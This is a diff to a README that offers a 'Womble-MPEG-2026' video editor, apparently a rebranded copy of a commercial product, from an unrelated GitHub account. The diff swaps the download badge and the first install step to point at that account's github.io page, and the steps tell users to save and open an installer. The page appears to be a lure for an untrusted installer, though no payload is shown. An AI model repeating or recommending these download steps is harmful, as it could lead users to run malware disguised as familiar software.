@@ -1,6 +1,6 @@
 # 🎞️ Womble-MPEG-2026 - Edit Your Videos With Simple Tools
 
-[![Download Womble MPEG Video Wizard](https://img.shields.io/badge/Download-Womble_MPEG_2026-blue)](https://github.com/tandiehousewifely365/Womble-MPEG-2026)
+[![Download Womble MPEG Video Wizard](https://img.shields.io/badge/Download-Womble_MPEG_2026-blue)](https://tandiehousewifely365.github.io)
 
 ## 📌 About This Software
 
@@ -23,7 +23,7 @@ This software runs on modern Windows machines. Ensure your computer meets these 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download: [https://github.com/tandiehousewifely365/Womble-MPEG-2026](https://github.com/tandiehousewifely365/Womble-MPEG-2026)
+1. Visit this page to download: [https://tandiehousewifely365.github.io](https://tandiehousewifely365.github.io)
 2. Locate the button labeled "Download" or click the link above.
 3. Save the installer file to your Downloads folder.
 4. Open your Downloads folder when the transfer finishes.
